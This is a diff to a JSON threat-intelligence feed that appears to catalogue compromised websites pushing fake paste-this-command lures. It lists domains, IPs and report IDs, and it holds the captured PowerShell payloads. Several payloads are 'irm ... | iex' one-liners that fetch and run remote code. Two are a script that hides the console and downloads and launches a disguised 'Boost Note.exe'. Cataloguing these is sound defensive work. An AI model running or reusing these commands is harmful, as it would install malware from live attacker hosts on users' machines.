@@ -1,5 +1,124 @@
 [
   {
+    "UrlDomain": "barco-ci.com",
+    "DeliveryUrl": [
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.98.131.142"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/045dc45870c27c02",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/045dc45870c27c02'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/045dc45870c27c02"
+    ],
+    "ReportId": "cmwm08hou1raj0omlprcdx0ey",
+    "ScannedAt": "2026-11-18T10:54:56.701000+00:00"
+  },
+  {
+    "UrlDomain": "nishman.shop",
+    "DeliveryUrl": [
+      "fastly.jsdelivr.net"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "185.26.122.6"
+    ],
+    "Related": [],
+    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
+    "ResolvedDownloadUrl": [
+      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
+    ],
+    "ReportId": "cmwlzx7181r4v0omlc0wtmgup",
+    "ScannedAt": "2026-11-18T10:46:09.706000+00:00"
+  },
+  {
+    "UrlDomain": "inno-change.org",
+    "DeliveryUrl": [
+      "lskannsserv.beer",
+      "waysmakeyourlifebetter.com",
+      "goodpersonofourcentury.com",
+      "besthappyfamily.com",
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "74.208.236.133"
+    ],
+    "Related": [
+      {
+        "Value": "https://waysmakeyourlifebetter.com/get_script",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://goodpersonofourcentury.com/get_script",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://besthappyfamily.com/get_script",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-cloud.codes/c27615610ccab1da",
+        "Type": "payload download"
+      },
+      {
+        "Value": "https://browse-cloud.codes/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/c27615610ccab1da'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/c27615610ccab1da"
+    ],
+    "ReportId": "cmwlzwqas1r3f0omlavhnj44e",
+    "ScannedAt": "2026-11-18T10:45:47.994000+00:00"
+  },
+  {
+    "UrlDomain": "cliniquedentairehongrie.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "51.91.236.193"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwlzw5oa1r2p0omliz6xurp7",
+    "ScannedAt": "2026-11-18T10:45:21.264000+00:00"
+  },
+  {
+    "UrlDomain": "safarwithsasha.com",
+    "DeliveryUrl": [
+      "fbifr.com"
+    ],
+    "PayloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "IP": [
+      "68.66.226.116"
+    ],
+    "Related": [],
+    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://fbifr.com/eoN"
+    ],
+    "ReportId": "cmwlzsh9q1r0l0oml4gpgxjes",
+    "ScannedAt": "2026-11-18T10:42:29.669000+00:00"
+  },
+  {
     "UrlDomain": "genopresse.com",
     "DeliveryUrl": [
       "fbifr.com"
@@ -10549,24 +10668,5 @@
     ],
     "ReportId": "cmwdguwhj03zw0omlnorqrh3r",
     "ScannedAt": "2026-11-12T11:30:20.446000+00:00"
-  },
-  {
-    "UrlDomain": "thejoints.shop",
-    "DeliveryUrl": [
-      "nexguard.pro"
-    ],
-    "PayloadUrl": [
-      "https://nexguard.pro/Girya/ff9a9c33c814a1a4"
-    ],
-    "IP": [
-      "50.6.138.145"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://nexguard[.]pro/Girya/ff9a9c33c814a1a4')|iex",
-    "ResolvedDownloadUrl": [
-      "https://nexguard.pro/Girya/ff9a9c33c814a1a4"
-    ],
-    "ReportId": "cmwdfg5is03uq0oml2mt1nbdk",
-    "ScannedAt": "2026-11-12T10:50:52.751000+00:00"
   }
 ]
